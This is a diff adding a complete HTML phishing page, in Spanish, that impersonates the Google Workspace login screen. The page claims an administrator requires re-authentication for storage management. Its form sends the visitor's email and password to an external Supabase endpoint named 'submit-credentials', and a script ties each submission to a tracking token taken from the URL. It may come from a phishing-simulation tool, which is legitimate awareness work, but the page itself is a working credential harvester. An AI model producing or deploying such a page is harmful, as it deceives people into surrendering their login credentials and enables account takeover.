@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<title>Google Workspace - Iniciar sesión</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;color:#202124;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .box{background:#fff;width:100%;max-width:450px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
+  .logo{height:24px;margin-bottom:16px}
+  h1{font-weight:400;font-size:24px;margin:0 0 8px}
+  .sub{font-size:14px;color:#5f6368;margin:0 0 32px}
+  input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;font-family:inherit;margin-bottom:24px}
+  input:focus{border:2px solid #1a73e8;padding:12px 14px}
+  .row{display:flex;justify-content:flex-end;align-items:center;margin-top:16px}
+  button{background:#1a73e8;color:#fff;border:none;padding:10px 24px;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer;font-family:inherit}
+  button:hover{background:#1765cc}
+</style></head>
+<body>
+<div class="box">
+  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/google.png" alt="Google Workspace">
+  <h1>Acceder a tu cuenta de empresa</h1>
+  <p class="sub">Tu administrador requiere reautenticación para gestionar el almacenamiento.</p>
+  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
+    <input type="hidden" name="token" id="token-field">
+    <input type="email" name="email" placeholder="usuario@empresa.com" required autofocus>
+    <input type="password" name="password" placeholder="Contraseña" required>
+    <div class="row"><button type="submit">Iniciar sesión</button></div>
+  </form>
+</div>
+<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
+</body></html>
